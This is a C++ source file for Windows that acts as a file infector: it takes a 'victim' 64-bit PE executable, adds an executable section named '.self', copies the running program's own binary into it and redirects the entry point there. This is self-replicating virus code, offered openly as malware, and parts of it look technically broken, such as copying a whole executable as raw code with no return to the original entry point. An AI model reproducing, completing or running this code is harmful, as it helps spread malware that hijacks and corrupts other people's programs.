#include <iostream>
#include <fstream>
#include <windows.h>
#include <vector>
#pragma pack(push, 1)

void PrintOptionalHeader(const IMAGE_NT_HEADERS64& ntHeaders) {
    const IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    // Imprimir otros campos si es necesario
}

void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, DWORD newEntryPointRVA);

struct PEHeader {
    IMAGE_DOS_HEADER dosHeader;
    IMAGE_NT_HEADERS64 ntHeaders;
};

#pragma pack(pop)

void PrintError(const char* message) {
    std::cerr << message << std::endl;
    exit(EXIT_FAILURE);
}

void InjectSelf(const std::string& victimFilePath, const std::string& outputFilePath, const char* selfCode, size_t selfCodeSize) {
    std::cout << "From InjectSelf: Victim file path is : " << victimFilePath
        << " Output file path is : " << outputFilePath
        << " Self-code size: " << selfCodeSize << std::endl;

    std::ifstream file(victimFilePath, std::ios::binary);
    if (!file) {
        PrintError("Cannot open victim file");
    }

    // Read the entire PE file into memory
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<char> fileData(fileSize);
    file.read(fileData.data(), fileSize);
    if (!file) {
        PrintError("Error reading PE file");
    }

    // Read the DOS header
    IMAGE_DOS_HEADER dosHeader;
    std::memcpy(&dosHeader, fileData.data(), sizeof(IMAGE_DOS_HEADER));

    // Read the NT headers
    IMAGE_NT_HEADERS64 ntHeaders;
    std::memcpy(&ntHeaders, fileData.data() + dosHeader.e_lfanew, sizeof(IMAGE_NT_HEADERS64));

    IMAGE_FILE_HEADER& fileHeader = ntHeaders.FileHeader;
    IMAGE_OPTIONAL_HEADER64& optionalHeader = ntHeaders.OptionalHeader;
    IMAGE_SECTION_HEADER* sections = reinterpret_cast<IMAGE_SECTION_HEADER*>(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    // Check the number of sections
    if (fileHeader.NumberOfSections < 1) {
        PrintError("Invalid PE file: No sections found");
    }

    // Calculate new section's Virtual Address and Raw Data Address
    IMAGE_SECTION_HEADER& lastSection = sections[fileHeader.NumberOfSections - 1];

    DWORD newSectionVirtualAddress = lastSection.VirtualAddress + ((lastSection.Misc.VirtualSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1));
    DWORD newSectionPointerToRawData = lastSection.PointerToRawData + ((lastSection.SizeOfRawData + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));

    // Ensure file size can accommodate new section
    size_t newFileSize = newSectionPointerToRawData + ((selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
    fileData.resize(newFileSize);

    // Define and initialize new section
    IMAGE_SECTION_HEADER newSection = {};
    strncpy_s(reinterpret_cast<char*>(newSection.Name), sizeof(newSection.Name), ".self", _TRUNCATE);
    newSection.Misc.VirtualSize = (selfCodeSize + optionalHeader.SectionAlignment - 1) & ~(optionalHeader.SectionAlignment - 1);
    newSection.VirtualAddress = newSectionVirtualAddress;
    newSection.SizeOfRawData = (selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    newSection.PointerToRawData = newSectionPointerToRawData;
    newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    // Update headers with new section information
    std::memcpy(fileData.data() + dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections, &newSection, sizeof(newSection));
    fileHeader.NumberOfSections++;
    optionalHeader.SizeOfImage = newSection.VirtualAddress + newSection.Misc.VirtualSize;

    // Calculate new SizeOfHeaders
    DWORD sizeOfHeaders = dosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS64) + sizeof(IMAGE_SECTION_HEADER) * fileHeader.NumberOfSections;
    sizeOfHeaders = (sizeOfHeaders + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1);
    optionalHeader.SizeOfHeaders = sizeOfHeaders;

    // Inject the self code into the new section
    std::memcpy(fileData.data() + newSection.PointerToRawData, selfCode, selfCodeSize);

    // Modify the entry point to point to the new section
    optionalHeader.AddressOfEntryPoint = newSection.VirtualAddress;

    // Write updated headers back to fileData
    std::memcpy(fileData.data() + dosHeader.e_lfanew, &ntHeaders, sizeof(IMAGE_NT_HEADERS64));
    std::memcpy(fileData.data(), &dosHeader, sizeof(IMAGE_DOS_HEADER));  // Write DOS header back as well

    // Write modified PE file to output
    std::ofstream outFile(outputFilePath, std::ios::binary);
    if (!outFile) {
        PrintError("Cannot open output file");
    }
    outFile.write(fileData.data(), fileData.size());
    std::cout << "Self-code injected and entry point modified successfully." << std::endl;
}

void ModifyEntryPoint(IMAGE_NT_HEADERS64& ntHeaders, DWORD newEntryPointRVA) {
    std::cout << "PE file headers read successfully" << std::endl;
    std::cout << "AddressOfEntryPoint: " << std::hex << ntHeaders.OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "ImageBase: " << std::hex << ntHeaders.OptionalHeader.ImageBase << std::endl;

    // Set the new entry point
    ntHeaders.OptionalHeader.AddressOfEntryPoint = newEntryPointRVA;

    std::cout << "PE file headers modified successfully" << std::endl;
    std::cout << "Address Of New Entry Point: " << std::hex << ntHeaders.OptionalHeader.AddressOfEntryPoint << std::endl;
    std::cout << "New ImageBase: " << std::hex << ntHeaders.OptionalHeader.ImageBase << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <victim PE file> <output PE file>" << std::endl;
        return EXIT_FAILURE;
    }

    std::string victimFilePath = argv[1];
    std::string outputFilePath = argv[2];

    // Read the self-code (current executable) into memory
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::ifstream selfFile(selfPath, std::ios::binary | std::ios::ate);
    if (!selfFile) {
        PrintError("Cannot open self file");
    }

    size_t selfCodeSize = selfFile.tellg();
    std::vector<char> selfCode(selfCodeSize);
    selfFile.seekg(0, std::ios::beg);
    selfFile.read(selfCode.data(), selfCodeSize);
    selfFile.close();

    // Inject the self-code into the victim PE file
    InjectSelf(victimFilePath, outputFilePath, selfCode.data(), selfCodeSize);

    system("pause");
    return 0;
}
